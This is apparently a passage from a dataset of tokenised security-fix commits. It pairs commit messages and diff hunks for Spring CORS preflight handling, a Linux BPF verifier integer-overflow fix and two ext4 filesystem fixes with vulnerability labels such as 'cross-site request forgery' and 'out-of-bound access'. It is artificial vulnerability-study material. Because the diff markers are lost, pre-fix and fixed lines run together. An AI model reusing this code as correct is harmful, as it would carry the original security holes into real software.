"instanceof", "HandlerMethod", "&", "&", "this", ".", "mappingRegistry", ".", "getCorsConfiguration", "(", "(", "HandlerMethod", ")", "handler", ")", "!", "=", "null", ")", "|", "|", "handler", ".", "equals", "(", "PREFLIGHT_AMBIGUOUS_MATCH", ")", ";", "(", "handler", "instanceof", "HandlerMethod", "&", "&", "this", ".", "mappingRegistry", ".", "getCorsConfiguration", "(", "(", "HandlerMethod", ")", "handler", ")", "!", "=", "null", ")", ";", "}", "@", "Override", "@", "@", "-", "1", ",", "5", "+", "1", ",", "5", "@", "@", "/", "*", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "*", "Copyright", "2002", "-", "2020", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "@", "@", "-", "70", ",", "7", "+", "70", ",", "7", "@", "@", "public", "void", "preflightRequestWithoutCorsConfigurationProvider", "(", ")", "throws", "Exception", "Object", "actual", "=", "this", ".", "handlerMapping", ".", "getHandler", "(", "exchange", ")", ".", "block", "(", ");", "assertThat", "(", "actual", ")", ".", "isNotNull", "(", ");", "assertThat", "(", "actual", ")", ".", "isSameAs", "(", "this", ".", "welcomeController", ")", ";", "assertThat", "(", "actual", ")", ".", "isNotSameAs", "(", "this", ".", "welcomeController", ")", ";", "}", "@", "Test", "@", "@", "-", "1", ",", "5", "+", "1", ",", "5", "@", "@", "/", "*", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "*", "Copyright", "2002", "-", "2020", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "@", "@", "-", "35", ",", "11", "+", "35", ",", "13", "@", "@", "import", "org", ".", "springframework", ".", "web", ".", "bind", ".", "annotation", ".", "RequestMapping", ";", "import", "org", ".", "springframework", ".", "web", ".", "bind", ".", "annotation", ".", "RequestMethod", ";", "import", "org", ".", "springframework", ".", "web", ".", "bind", ".", "annotation", ".", "RestController", ";", "import", "org", ".", "springframework", ".", "web", ".", "client", ".", "HttpClientErrorException", ";", "import", "org", ".", "springframework", ".", "web", ".", "client", ".", "RestTemplate", ";", "import", "org", ".", "springframework", ".", "web", ".", "reactive", ".", "config", ".", "EnableWebFlux", ";", "import", "org", ".", "springframework", ".", "web", ".", "testfixture", ".", "http", ".", "server", ".", "reactive", ".", "bootstrap", ".", "HttpServer", ";", "import", "static", "org", ".", "assertj", ".", "core", ".", "api", ".", "Assertions", ".", "assertThat", ";", "import", "static", "org", ".", "assertj", ".", "core", ".", "api", ".", "Assertions", ".", "fail", ";", "/", "**", "*", "Integration", "tests", "with", "{", "@", "code", "@", "CrossOrigin", "}", "and", "{", "@", "code", "@", "RequestMapping", "}", "@", "@", "-", "89", ",", "6", "+", "91", ",", "28", "@", "@", "void", "actualGetRequestWithoutAnnotation", "(", "HttpServer", "httpServer", ")", "throws", "Exception", "{", "assertThat", "(", "entity", ".", "getBody", "(", "))", ".", "isEqualTo", "(", "\"", "no", "\"", ");", "}", "@", "ParameterizedHttpServerTest", "void", "optionsRequestWithAccessControlRequestMethod", "(", "HttpServer", "httpServer", ")", "throws", "Exception", "{", "startServer", "(", "httpServer", ")", ";", "this", ".", "headers", ".", "clear", "(", ");", "this", ".", "headers", ".", "add", "(", "HttpHeaders", ".", "ACCESS_CONTROL_REQUEST_METHOD", ",", "\"", "GET", "\"", ");", "ResponseEntity", "<", "String", ">", "entity", "=", "performOptions", "(", "\"/", "no", "\"", ",", "this", ".", "headers", ",", "String", ".", "class", ")", ";", "assertThat", "(", "entity", ".", "getBody", "(", "))", ".", "isNull", "(", ");", "}", "@", "ParameterizedHttpServerTest", "void", "preflightRequestWithoutAnnotation", "(", "HttpServer", "httpServer", ")", "throws", "Exception", "{", "startServer", "(", "httpServer", ")", ";", "this", ".", "headers", ".", "add", "(", "HttpHeaders", ".", "ACCESS_CONTROL_REQUEST_METHOD", ",", "\"", "GET", "\"", ");", "try", "{", "performOptions", "(", "\"/", "no", "\"", ",", "this", ".", "headers", ",", "Void", ".", "class", ")", ";", "fail", "(", "\"", "Preflight", "request", "without", "CORS", "configuration", "should", "fail", "\"", ");", "}", "catch", "(", "HttpClientErrorException", "ex", ")", "{", "assertThat", "(", "ex", ".", "getStatusCode", "(", "))", ".", "isEqualTo", "(", "HttpStatus", ".", "FORBIDDEN", ")", ";", "}", "}", "@", "ParameterizedHttpServerTest", "void", "actualPostRequestWithoutAnnotation", "(", "HttpServer", "httpServer", ")", "throws", "Exception", "{", "startServer", "(", "httpServer", ")", ";", "@", "@", "-", "1", ",", "5", "+", "1", ",", "5", "@", "@", "/", "*", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "*", "Copyright", "2002", "-", "2020", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "@", "@", "-", "414", ",", "7", "+", "414", ",", "7", "@", "@", "else", "if", "(", "logger", ".", "isDebugEnabled", "(", ")", "&", "&", "!", "request", ".", "getDispatcherType", "(", ").", "equals", "(", "Dispatch", "logger", ".", "debug", "(", "\"", "Mapped", "to", "\"", "+", "executionChain", ".", "getHandler", "(", "))", ";", "}", "if", "(", "hasCorsConfigurationSource", "(", "handler", ")", ")", "{", "if", "(", "hasCorsConfigurationSource", "(", "handler", ")", "|", "|", "CorsUtils", ".", "isPreFlightRequest", "(", "request", ")", ")", "{", "CorsConfiguration", "config", "=", "(", "this", ".", "corsConfigurationSource", "!", "=", "null", "?", "this", ".", "corsConfigurationSource", ".", "getCorsConfiguration", "(", "request", ")", ":", "null", ")", ";", "CorsConfiguration", "handlerConfig", "=", "getCorsConfiguration", "(", "handler", ",", "request", ")", ";", "config", "=", "(", "config", "!", "=", "null", "?", "config", ".", "combine", "(", "handlerConfig", ")", ":", "handlerConfig", ")", ";", "@", "@", "-", "1", ",", "5", "+", "1", ",", "5", "@", "@", "/", "*", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "*", "Copyright", "2002", "-", "2020", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "@", "@", "-", "458", ",", "8", "+", "458", ",", "7", "@", "@", "protected", "HandlerMethod", "handleNoMatch", "(", "Set", "<", "T", ">", "mappings", ",", "String", "lookupPath", ",", "HttpSe", "@", "Override", "protected", "boolean", "hasCorsConfigurationSource", "(", "Object", "handler", ")", "{", "return", "super", ".", "hasCorsConfigurationSource", "(", "handler", ")", "|", "|", "(", "handler", "instanceof", "HandlerMethod", "&", "&", "this", ".", "mappingRegistry", ".", "getCorsConfiguration", "(", "(", "HandlerMethod", ")", "handler", ")", "!", "=", "null", ")", "|", "|", "handler", ".", "equals", "(", "PREFLIGHT_AMBIGUOUS_MATCH", ")", ";", "(", "handler", "instanceof", "HandlerMethod", "&", "&", "this", ".", "mappingRegistry", ".", "getCorsConfiguration", "(", "(", "HandlerMethod", ")", "handler", ")", "!", "=", "null", ")", ";", "}", "@", "Override", "@", "@", "-", "1", ",", "5", "+", "1", ",", "5", "@", "@", "/", "*", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "*", "Copyright", "2002", "-", "2020", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "@", "@", "-", "86", ",", "7", "+", "86", ",", "8", "@", "@", "void", "preflightRequestWithoutCorsConfigurationProvider", "(", ")", "throws", "Exception", "{", "HandlerExecutionChain", "chain", "=", "this", ".", "handlerMapping", ".", "getHandler", "(", "this", ".", "request", ")", ";", "assertThat", "(", "chain", ")", ".", "isNotNull", "(", ");", "assertThat", "(", "chain", ".", "getHandler", "(", "))", ".", "isInstanceOf", "(", "SimpleHandler", ".", "class", ")", ";", "assertThat", "(", "chain", ".", "getHandler", "(", "))", ".", "isNotNull", "(", ");", "assertThat", "(", "chain", ".", "getHandler", "(", ").", "getClass", "(", ").", "getSimpleName", "(", "))", ".", "isEqualTo", "(", "\"", "PreFlightHandler", "\"", ");", "}", "@", "Test", "@", "@", "-", "1", ",", "5", "+", "1", ",", "5", "@", "@", "/", "*", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "*", "Copyright", "2002", "-", "2020", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "@", "@", "-", "69", ",", "6", "+", "69", ",", "10", "@", "@", "private", "final", "MockHttpServletRequest", "request", "=", "new", "MockHttpServletRequest", "(", ");", "private", "final", "String", "optionsHandler", "=", "\"", "org", ".", "springframework", ".", "web", ".", "servlet", ".", "mvc", ".", "method", ".", "RequestMappingInfoHandlerMapping", "$", "HttpOptionsHandler", "#", "handle", "(", ")\"", ";", "private", "final", "String", "corsPreflightHandler", "=", "\"", "org", ".", "springframework", ".", "web", ".", "servlet", ".", "handler", ".", "AbstractHandlerMapping", "$", "PreFlightHandler", "\"", ";", "@", "BeforeEach", "@", "SuppressWarnings", "(", "\"", "resource", "\"", ")", "@", "@", "-", "96", ",", "6", "+", "100", ",", "25", "@", "@", "public", "void", "noAnnotationWithoutOrigin", "(", ")", "throws", "Exception", "{", "assertThat", "(", "getCorsConfiguration", "(", "chain", ",", "false", ")", ").", "isNull", "(", ");", "}", "@", "Test", "public", "void", "noAnnotationWithAccessControlRequestMethod", "(", ")", "throws", "Exception", "{", "this", ".", "handlerMapping", ".", "registerHandler", "(", "new", "MethodLevelController", "(", "))", ";", "MockHttpServletRequest", "request", "=", "new", "MockHttpServletRequest", "(", "\"", "OPTIONS", "\"", ",", "\"", "/", "no", "\"", ");", "request", ".", "addHeader", "(", "HttpHeaders", ".", "ACCESS_CONTROL_REQUEST_METHOD", ",", "\"", "GET", "\"", ");", "HandlerExecutionChain", "chain", "=", "this", ".", "handlerMapping", ".", "getHandler", "(", "request", ")", ";", "assertThat", "(", "chain", ".", "getHandler", "(", ").", "toString", "(", "))", ".", "isEqualTo", "(", "optionsHandler", ")", ";", "}", "@", "Test", "public", "void", "noAnnotationWithPreflightRequest", "(", ")", "throws", "Exception", "{", "this", ".", "handlerMapping", ".", "registerHandler", "(", "new", "MethodLevelController", "(", "))", ";", "MockHttpServletRequest", "request", "=", "new", "MockHttpServletRequest", "(", "\"", "OPTIONS", "\"", ",", "\"", "/", "no", "\"", ");", "request", ".", "addHeader", "(", "HttpHeaders", ".", "ORIGIN", ",", "\"", "https", ":", "//", "domain", ".", "com", "/", "\")", ";", "request", ".", "addHeader", "(", "HttpHeaders", ".", "ACCESS_CONTROL_REQUEST_METHOD", ",", "\"", "GET", "\"", ");", "HandlerExecutionChain", "chain", "=", "this", ".", "handlerMapping", ".", "getHandler", "(", "request", ")", ";", "assertThat", "(", "chain", ".", "getHandler", "(", ").", "getClass", "(", ").", "getName", "(", "))", ".", "isEqualTo", "(", "corsPreflightHandler", ")", ";", "}", "@", "Test", "/", "/", "SPR", "-", "12931", "public", "void", "noAnnotationWithOrigin", "(", ")", "throws", "Exception", "{", "this", ".", "handlerMapping", ".", "registerHandler", "(", "new", "MethodLevelController", "(", "))", ";"], "docstring_tokens": ["cross-site", "request", "forgery"]}
{"contents": ["bpf:", "fix", "integer", "overflows", "There", "were", "various", "issues", "related", "to", "the", "limited", "size", "of", "integers", "used", "in", "the", "verifier:", "-", "`off", "+", "size`", "overflow", "in", "__check_map_access()", "-", "`off", "+", "reg->off`", "overflow", "in", "check_mem_access()", "-", "`off", "+", "reg->var_off.value`", "overflow", "or", "32-bit", "truncation", "of", "`reg->var_off.value`", "in", "check_mem_access()", "-", "32-bit", "truncation", "in", "check_stack_boundary()", "Make", "sure", "that", "any", "integer", "math", "cannot", "overflow", "by", "not", "allowing", "pointer", "math", "with", "large", "values.", "Also", "reduce", "the", "scope", "of", "\"scalar", "op", "scalar\"", "tracking.", "Fixes:", "f1174f77b50c", "(\"bpf/verifier:", "rework", "value", "tracking\")", "Reported-by:", "Jann", "Horn", "<jannh@google.com>", "Signed-off-by:", "Alexei", "Starovoitov", "<ast@kernel.org>", "Signed-off-by:", "Daniel", "Borkmann", "<daniel@iogearbox.net>"], "code_tokens": ["@", "@", "-", "15", ",", "11", "+", "15", ",", "11", "@", "@", "*", "In", "practice", "this", "is", "far", "bigger", "than", "any", "realistic", "pointer", "offset", ";", "this", "limit", "*", "ensures", "that", "umax_value", "+", "(", "int", ")", "off", "+", "(", "int", ")", "size", "cannot", "overflow", "a", "u64", ".", "*", "/", "#", "define", "BPF_MAX_VAR_OFF", "(", "1ULL", "<", "<", "31", ")", "#", "define", "BPF_MAX_VAR_OFF", "(", "1", "<", "<", "29", ")", "/", "*", "Maximum", "variable", "size", "permitted", "for", "ARG_CONST_SIZE", "[", "_OR_ZERO", "]", ".", "This", "ensures", "*", "that", "converting", "umax_value", "to", "int", "cannot", "overflow", ".", "*", "/", "#", "define", "BPF_MAX_VAR_SIZ", "INT_MAX", "#", "define", "BPF_MAX_VAR_SIZ", "(", "1", "<", "<", "29", ")", "/", "*", "Liveness", "marks", ",", "used", "for", "registers", "and", "spilled", "-", "regs", "(", "in", "stack", "slots", ")", ".", "*", "Read", "marks", "propagate", "upwards", "until", "they", "find", "a", "write", "mark", ";", "they", "record", "that", "@", "@", "-", "1819", ",", "6", "+", "1819", ",", "41", "@", "@", "static", "bool", "signed_sub_overflows", "(", "s64", "a", ",", "s64", "b", ")", "return", "res", ">", "a", ";", "}", "static", "bool", "check_reg_sane_offset", "(", "struct", "bpf_verifier_env", "*", "env", ",", "const", "struct", "bpf_reg_state", "*", "reg", ",", "enum", "bpf_reg_type", "type", ")", "{", "bool", "known", "=", "tnum_is_const", "(", "reg", "-", ">", "var_off", ")", ";", "s64", "val", "=", "reg", "-", ">", "var_off", ".", "value", ";", "s64", "smin", "=", "reg", "-", ">", "smin_value", ";", "if", "(", "known", "&", "&", "(", "val", ">", "=", "BPF_MAX_VAR_OFF", "|", "|", "val", "<", "=", "-", "BPF_MAX_VAR_OFF", ")", ")", "{", "verbose", "(", "env", ",", "\"", "math", "between", "%", "s", "pointer", "and", "%", "lld", "is", "not", "allowed", "\\", "n", "\"", ",", "reg_type_str", "[", "type", "]", ",", "val", ")", ";", "return", "false", ";", "}", "if", "(", "reg", "-", ">", "off", ">", "=", "BPF_MAX_VAR_OFF", "|", "|", "reg", "-", ">", "off", "<", "=", "-", "BPF_MAX_VAR_OFF", ")", "{", "verbose", "(", "env", ",", "\"", "%", "s", "pointer", "offset", "%", "d", "is", "not", "allowed", "\\", "n", "\"", ",", "reg_type_str", "[", "type", "]", ",", "reg", "-", ">", "off", ")", ";", "return", "false", ";", "}", "if", "(", "smin", "=", "=", "S64_MIN", ")", "{", "verbose", "(", "env", ",", "\"", "math", "between", "%", "s", "pointer", "and", "register", "with", "unbounded", "min", "value", "is", "not", "allowed", "\\", "n", "\"", ",", "reg_type_str", "[", "type", "]", ");", "return", "false", ";", "}", "if", "(", "smin", ">", "=", "BPF_MAX_VAR_OFF", "|", "|", "smin", "<", "=", "-", "BPF_MAX_VAR_OFF", ")", "{", "verbose", "(", "env", ",", "\"", "value", "%", "lld", "makes", "%", "s", "pointer", "be", "out", "of", "bounds", "\\", "n", "\"", ",", "smin", ",", "reg_type_str", "[", "type", "]", ");", "return", "false", ";", "}", "return", "true", ";", "}", "/", "*", "Handles", "arithmetic", "on", "a", "pointer", "and", "a", "scalar", ":", "computes", "new", "min", "/", "max", "and", "var_off", ".", "*", "Caller", "should", "also", "handle", "BPF_MOV", "case", "separately", ".", "*", "If", "we", "return", "-", "EACCES", ",", "caller", "may", "want", "to", "try", "again", "treating", "pointer", "as", "a", "@", "@", "-", "1887", ",", "6", "+", "1922", ",", "10", "@", "@", "static", "int", "adjust_ptr_min_max_vals", "(", "struct", "bpf_verifier_env", "*", "env", ",", "dst_reg", "-", ">", "type", "=", "ptr_reg", "-", ">", "type", ";", "dst_reg", "-", ">", "id", "=", "ptr_reg", "-", ">", "id", ";", "if", "(", "!", "check_reg_sane_offset", "(", "env", ",", "off_reg", ",", "ptr_reg", "-", ">", "type", ")", "|", "|", "!", "check_reg_sane_offset", "(", "env", ",", "ptr_reg", ",", "ptr_reg", "-", ">", "type", ")", ")", "return", "-", "EINVAL", ";", "switch", "(", "opcode", ")", "{", "case", "BPF_ADD", ":", "/", "*", "We", "can", "take", "a", "fixed", "offset", "as", "long", "as", "it", "doesn", "'", "t", "overflow", "@", "@", "-", "2017", ",", "6", "+", "2056", ",", "9", "@", "@", "static", "int", "adjust_ptr_min_max_vals", "(", "struct", "bpf_verifier_env", "*", "env", ",", "return", "-", "EACCES", ";", "}", "if", "(", "!", "check_reg_sane_offset", "(", "env", ",", "dst_reg", ",", "ptr_reg", "-", ">", "type", ")", ")", "return", "-", "EINVAL", ";", "__update_reg_bounds", "(", "dst_reg", ")", ";", "__reg_deduce_bounds", "(", "dst_reg", ")", ";", "__reg_bound_offset", "(", "dst_reg", ")", ";", "@", "@", "-", "2046", ",", "6", "+", "2088", ",", "12", "@", "@", "static", "int", "adjust_scalar_min_max_vals", "(", "struct", "bpf_verifier_env", "*", "env", ",", "src_known", "=", "tnum_is_const", "(", "src_reg", ".", "var_off", ")", ";", "dst_known", "=", "tnum_is_const", "(", "dst_reg", "-", ">", "var_off", ")", ";", "if", "(", "!", "src_known", "&", "&", "opcode", "!", "=", "BPF_ADD", "&", "&", "opcode", "!", "=", "BPF_SUB", "&", "&", "opcode", "!", "=", "BPF_AND", ")", "{", "__mark_reg_unknown", "(", "dst_reg", ")", ";", "return", "0", ";", "}", "switch", "(", "opcode", ")", "{", "case", "BPF_ADD", ":", "if", "(", "signed_add_overflows", "(", "dst_reg", "-", ">", "smin_value", ",", "smin_val", ")", "|", "|"], "docstring_tokens": ["integer", "overflow"]}
{"contents": ["ext4:", "clear", "i_data", "in", "ext4_inode_info", "when", "removing", "inline", "data", "When", "converting", "from", "an", "inode", "from", "storing", "the", "data", "in-line", "to", "a", "data", "block,", "ext4_destroy_inline_data_nolock()", "was", "only", "clearing", "the", "on-disk", "copy", "of", "the", "i_blocks[]", "array.", "It", "was", "not", "clearing", "copy", "of", "the", "i_blocks[]", "in", "ext4_inode_info,", "in", "i_data[],", "which", "is", "the", "copy", "actually", "used", "by", "ext4_map_blocks().", "This", "didn't", "matter", "much", "if", "we", "are", "using", "extents,", "since", "the", "extents", "header", "would", "be", "invalid", "and", "thus", "the", "extents", "could", "would", "re-initialize", "the", "extents", "tree.", "But", "if", "we", "are", "using", "indirect", "blocks,", "the", "previous", "contents", "of", "the", "i_blocks", "array", "will", "be", "treated", "as", "block", "numbers,", "with", "potentially", "catastrophic", "results", "to", "the", "file", "system", "integrity", "and/or", "user", "data.", "This", "gets", "worse", "if", "the", "file", "system", "is", "using", "a", "1k", "block", "size", "and", "s_first_data", "is", "zero,", "but", "even", "without", "this,", "the", "file", "system", "can", "get", "quite", "badly", "corrupted.", "This", "addresses", ".", "https://bugzilla.kernel.org/show_bug.cgi?id=200015", "Signed-off-by:", "Theodore", "Ts'o", "<tytso@mit.edu>", "Cc:", "stable@kernel.org"], "code_tokens": ["@", "@", "-", "437", ",", "6", "+", "437", ",", "7", "@", "@", "static", "int", "ext4_destroy_inline_data_nolock", "(", "handle_t", "*", "handle", ",", "memset", "(", "(", "void", "*", ")", "ext4_raw_inode", "(", "&", "is", ".", "iloc", ")", "->", "i_block", ",", "0", ",", "EXT4_MIN_INLINE_DATA_SIZE", ")", ";", "memset", "(", "ei", "-", ">", "i_data", ",", "0", ",", "EXT4_MIN_INLINE_DATA_SIZE", ")", ";", "if", "(", "ext4_has_feature_extents", "(", "inode", "-", ">", "i_sb", ")", ")", "{", "if", "(", "S_ISDIR", "(", "inode", "-", ">", "i_mode", ")", "|", "|"], "docstring_tokens": ["out-of-bound", "access"]}
{"contents": ["ext4:", "fix", "races", "between", "page", "faults", "and", "hole", "punching", "Currently,", "page", "faults", "and", "hole", "punching", "are", "completely", "unsynchronized.", "This", "can", "result", "in", "page", "fault", "faulting", "in", "a", "page", "into", "a", "range", "that", "we", "are", "punching", "after", "truncate_pagecache_range()", "has", "been", "called", "and", "thus", "we", "can", "end", "up", "with", "a", "page", "mapped", "to", "disk", "blocks", "that", "will", "be", "shortly", "freed.", "Filesystem", "corruption", "will", "shortly", "follow.", "Note", "that", "the", "same", "race", "is", "avoided", "for", "truncate", "by", "checking", "page", "fault", "offset", "against", "i_size", "but", "there", "isn't", "similar", "mechanism", "available", "for", "punching", "holes.", "Fix", "the", "problem", "by", "creating", "new", "rw", "semaphore", "i_mmap_sem", "in", "inode", "and", "grab", "it", "for", "writing", "over", "truncate,", "hole", "punching,", "and", "other", "functions", "removing", "blocks", "from", "extent", "tree", "and", "for", "read", "over", "page", "faults.", "We", "cannot", "easily", "use", "i_data_sem", "for", "this", "since", "that", "ranks", "below", "transaction", "start", "and", "we", "need", "something", "ranking", "above", "it", "so", "that", "it", "can", "be", "held", "over", "the", "whole", "truncate", "/", "hole", "punching", "operation.", "Also", "remove", "various", "workarounds", "we", "had", "in", "the", "code", "to", "reduce", "race", "window", "when", "page", "fault", "could", "have", "created", "pages", "with", "stale", "mapping", "information.", "Signed-off-by:", "Jan", "Kara", "<jack@suse.com>", "Signed-off-by:", "Theodore", "Ts'o", "<tytso@mit.edu>"], "code_tokens": ["@", "@", "-", "910", ",", "6", "+", "910", ",", "15", "@", "@", "struct", "ext4_inode_info", "{", "*", "by", "other", "means", ",", "so", "we", "have", "i_data_sem", ".", "*", "/", "struct", "rw_semaphore", "i_data_sem", ";", "/", "*", "*", "i_mmap_sem", "is", "for", "serializing", "page", "faults", "with", "truncate", "/", "punch", "hole", "*", "operations", ".", "We", "have", "to", "make", "sure", "that", "new", "page", "cannot", "be", "faulted", "in", "*", "a", "section", "of", "the", "inode", "that", "is", "being", "punched", ".", "We", "cannot", "easily", "use", "*", "i_data_sem", "for", "this", "since", "we", "need", "protection", "for", "the", "whole", "punch", "*", "operation", "and", "i_data_sem", "ranks", "below", "transaction", "start", "so", "we", "have", "*", "to", "occasionally", "drop", "it", ".", "*", "/", "struct", "rw_semaphore", "i_mmap_sem", ";", "struct", "inode", "vfs_inode", ";", "struct", "jbd2_inode", "*", "jinode", ";", "@", "@", "-", "2484", ",", "6", "+", "2493", ",", "7", "@", "@", "extern", "int", "ext4_chunk_trans_blocks", "(", "struct", "inode", "*", ",", "int", "nrblocks", ")", ";", "extern", "int", "ext4_zero_partial_blocks", "(", "handle_t", "*", "handle", ",", "struct", "inode", "*", "inode", ",", "loff_t", "lstart", ",", "loff_t", "lend", ")", ";", "extern", "int", "ext4_page_mkwrite", "(", "struct", "vm_area_struct", "*", "vma", ",", "struct", "vm_fault", "*", "vmf", ")", ";", "extern", "int", "ext4_filemap_fault", "(", "struct", "vm_area_struct", "*", "vma", ",", "struct", "vm_fault", "*", "vmf", ")", ";", "extern", "qsize_t", "*", "ext4_get_reserved_space", "(", "struct", "inode", "*", "inode", ")", ";", "extern", "void", "ext4_da_update_reserve_space", "(", "struct", "inode", "*", "inode", ",", "int", "used", ",", "int", "quota_claim", ")", ";", "@", "@", "-", "4770", ",", "7", "+", "4770", ",", "6", "@", "@", "static", "long", "ext4_zero_range", "(", "struct", "file", "*", "file", ",", "loff_t", "offset", ",", "int", "partial_begin", ",", "partial_end", ";", "loff_t", "start", ",", "end", ";", "ext4_lblk_t", "lblk", ";", "struct", "address_space", "*", "mapping", "=", "inode", "-", ">", "i_mapping", ";", "unsigned", "int", "blkbits", "=", "inode", "-", ">", "i_blkbits", ";", "trace_ext4_zero_range", "(", "inode", ",", "offset", ",", "len", ",", "mode", ")", ";", "@", "@", "-", "4785", ",", "17", "+", "4784", ",", "6", "@", "@", "static", "long", "ext4_zero_range", "(", "struct", "file", "*", "file", ",", "loff_t", "offset", ",", "return", "ret", ";", "}", "/", "*", "*", "Write", "out", "all", "dirty", "pages", "to", "avoid", "race", "conditions", "*", "Then", "release", "them", ".", "*", "/", "if", "(", "mapping", "-", ">", "nrpages", "&", "&", "mapping_tagged", "(", "mapping", ",", "PAGECACHE_TAG_DIRTY", ")", ")", "{", "ret", "=", "filemap_write_and_wait_range", "(", "mapping", ",", "offset", ",", "offset", "+", "len", "-", "1", ")", ";", "if", "(", "ret", ")", "return", "ret", ";", "}", "/", "*", "*", "Round", "up", "offset", ".", "This", "is", "not", "fallocate", ",", "we", "neet", "to", "zero", "out", "*", "blocks", ",", "so", "convert", "interior", "block", "aligned", "part", "of", "the", "range", "to", "@", "@", "-", "4856", ",", "16", "+", "4844", ",", "22", "@", "@", "static", "long", "ext4_zero_range", "(", "struct", "file", "*", "file", ",", "loff_t", "offset", ",", "flags", "|", "=", "(", "EXT4_GET_BLOCKS_CONVERT_UNWRITTEN", "|", "EXT4_EX_NOCACHE", ")", ";", "/", "*", "Now", "release", "the", "pages", "and", "zero", "block", "aligned", "part", "of", "pages", "*", "/", "truncate_pagecache_range", "(", "inode", ",", "start", ",", "end", "-", "1", ")", ";", "inode", "-", ">", "i_mtime", "=", "inode", "-", ">", "i_ctime", "=", "ext4_current_time", "(", "inode", ")", ";", "/", "*", "Wait", "all", "existing", "dio", "workers", ",", "newcomers", "will", "block", "on", "i_mutex", "*", "/", "ext4_inode_block_unlocked_dio", "(", "inode", ")", ";", "inode_dio_wait", "(", "inode", ")", ";", "/", "*", "*", "Prevent", "page", "faults", "from", "reinstantiating", "pages", "we", "have", "*", "released", "from", "page", "cache", ".", "*", "/", "down_write", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "/", "*", "Now", "release", "the", "pages", "and", "zero", "block", "aligned", "part", "of", "pages", "*", "/", "truncate_pagecache_range", "(", "inode", ",", "start", ",", "end", "-", "1", ")", ";", "inode", "-", ">", "i_mtime", "=", "inode", "-", ">", "i_ctime", "=", "ext4_current_time", "(", "inode", ")", ";", "ret", "=", "ext4_alloc_file_blocks", "(", "file", ",", "lblk", ",", "max_blocks", ",", "new_size", ",", "flags", ",", "mode", ")", ";", "up_write", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "if", "(", "ret", ")", "goto", "out_dio", ";", "}", "@", "@", "-", "5524", ",", "17", "+", "5518", ",", "22", "@", "@", "int", "ext4_collapse_range", "(", "struct", "inode", "*", "inode", ",", "loff_t", "offset", ",", "loff_t", "len", ")", "goto", "out_mutex", ";", "}", "truncate_pagecache", "(", "inode", ",", "ioffset", ")", ";", "/", "*", "Wait", "for", "existing", "dio", "to", "complete", "*", "/", "ext4_inode_block_unlocked_dio", "(", "inode", ")", ";", "inode_dio_wait", "(", "inode", ")", ";", "/", "*", "*", "Prevent", "page", "faults", "from", "reinstantiating", "pages", "we", "have", "released", "from", "*", "page", "cache", ".", "*", "/", "down_write", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "truncate_pagecache", "(", "inode", ",", "ioffset", ")", ";", "credits", "=", "ext4_writepage_trans_blocks", "(", "inode", ")", ";", "handle", "=", "ext4_journal_start", "(", "inode", ",", "EXT4_HT_TRUNCATE", ",", "credits", ")", ";", "if", "(", "IS_ERR", "(", "handle", ")", ")", "{", "ret", "=", "PTR_ERR", "(", "handle", ")", ";", "goto", "out_dio", ";", "goto", "out_mmap", ";", "}", "down_write", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_data_sem", ")", ";", "@", "@", "-", "5573", ",", "7", "+", "5572", ",", "8", "@", "@", "int", "ext4_collapse_range", "(", "struct", "inode", "*", "inode", ",", "loff_t", "offset", ",", "loff_t", "len", ")", "out_stop", ":", "ext4_journal_stop", "(", "handle", ")", ";", "out_dio", ":", "out_mmap", ":", "up_write", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "ext4_inode_resume_unlocked_dio", "(", "inode", ")", ";", "out_mutex", ":", "mutex_unlock", "(", "&", "inode", "-", ">", "i_mutex", ")", ";", "@", "@", "-", "5660", ",", "17", "+", "5660", ",", "22", "@", "@", "int", "ext4_insert_range", "(", "struct", "inode", "*", "inode", ",", "loff_t", "offset", ",", "loff_t", "len", ")", "goto", "out_mutex", ";", "}", "truncate_pagecache", "(", "inode", ",", "ioffset", ")", ";", "/", "*", "Wait", "for", "existing", "dio", "to", "complete", "*", "/", "ext4_inode_block_unlocked_dio", "(", "inode", ")", ";", "inode_dio_wait", "(", "inode", ")", ";", "/", "*", "*", "Prevent", "page", "faults", "from", "reinstantiating", "pages", "we", "have", "released", "from", "*", "page", "cache", ".", "*", "/", "down_write", "(", "&", "EXT4_I", "(", "inode", ")", "->", "i_mmap_sem", ")", ";", "truncate_pagecache", "(", "inode", ",", "ioffset", ")", ";", "credits", "=", "ext4_writepage_trans_blocks", "(", "inode", ")", ";", "handle", "=", "ext4_journal_start", "(", "inode", ",", 